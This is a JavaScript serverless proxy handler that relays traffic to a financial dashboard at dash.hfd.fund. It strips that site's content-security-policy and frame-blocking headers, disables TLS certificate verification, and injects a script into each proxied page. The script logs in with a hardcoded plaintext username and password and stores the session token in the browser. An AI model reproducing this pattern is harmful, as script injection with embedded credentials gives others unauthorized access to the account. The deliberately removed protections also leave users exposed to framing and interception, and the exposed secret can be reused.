const https = require("https");
const http = require("http");

const INJECT_SCRIPT = `
<script><!-- Marvis -->
(function(){
var FW=window.fetch,XH=window.XMLHttpRequest,B=location.origin;
if(!localStorage.getItem("hfd_authed")){
FW(B+"/api/proxy/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({username:"mm",password:"5467942qw"})})
.then(function(r){return r.json()}).then(function(d){
var t=d.access_token||d.token||"";
if(t){localStorage.setItem("hfd_authed","1");localStorage.setItem("hfd_access_token",t);localStorage.setItem("hfd_username","mm");}
location.reload();
}).catch(function(){});
}
})();
<\/script>
`;

function doReq(url, method, headers, body) {
  return new Promise(function(resolve, reject) {
    var u = new URL(url);
    var mod = u.protocol === "https:" ? https : http;
    var opts = {
      hostname: u.hostname, port: u.port, path: u.pathname + u.search,
      method: method, headers: headers || {},
      rejectUnauthorized: false, timeout: 30000
    };
    var req = mod.request(opts, function(r) {
      var chunks = [];
      r.on("data", function(c) { chunks.push(c); });
      r.on("end", function() { resolve({ status: r.statusCode, headers: r.headers, body: Buffer.concat(chunks) }); });
    });
    req.on("error", reject);
    req.on("timeout", function() { req.destroy(); reject(new Error("timeout")); });
    if (body) req.write(body);
    req.end();
  });
}

module.exports = async function handler(req, res) {
  var pp = req.query.path || [];
  var subPath = decodeURIComponent(pp.join("/") || "");
  var targetUrl = "https://dash.hfd.fund/" + subPath;
  
  if (subPath === "login") {
    targetUrl = "https://dash.hfd.fund/api/login";
  }
  
  try {
    var fwd = {};
    ["content-type", "accept", "authorization", "cookie", "origin"].forEach(function(k) {
      if (req.headers[k]) fwd[k] = req.headers[k];
    });
    fwd["host"] = "dash.hfd.fund";
    
    var body = null;
    if (req.body) {
      body = typeof req.body === "string" ? req.body : JSON.stringify(req.body);
    } else if (req.method !== "GET" && req.method !== "HEAD") {
      try {
        body = await new Promise(function(resolve, reject) {
          var chunks = [], timer = setTimeout(function() { resolve(""); }, 3000);
          req.on("data", function(c) { chunks.push(c); clearTimeout(timer); timer = setTimeout(function() { resolve(Buffer.concat(chunks).toString()); }, 3000); });
          req.on("end", function() { clearTimeout(timer); resolve(Buffer.concat(chunks).toString()); });
        });
      } catch(e) { body = ""; }
    }
    
    var result = await doReq(targetUrl, req.method, fwd, body);
    
    var ct = (result.headers["content-type"] || "").toLowerCase();
    var isJson = ct.indexOf("application/json") >= 0;
    var isHtml = ct.indexOf("text/html") >= 0;
    
    var skip = ["content-encoding", "transfer-encoding", "content-length", "content-security-policy", "x-frame-options"];
    Object.keys(result.headers).forEach(function(k) {
      if (skip.indexOf(k.toLowerCase()) < 0) {
        res.setHeader(k, result.headers[k]);
      }
    });
    
    var respBody = result.body;
    if (isHtml && Buffer.isBuffer(respBody)) {
      var html = respBody.toString("utf-8");
      html = html.replace("<head>", "<head>" + INJECT_SCRIPT);
      respBody = Buffer.from(html, "utf-8");
    }
    
    res.status(result.status).send(respBody);
  } catch(e) {
    res.status(502).send("Proxy error: " + e.message);
  }
};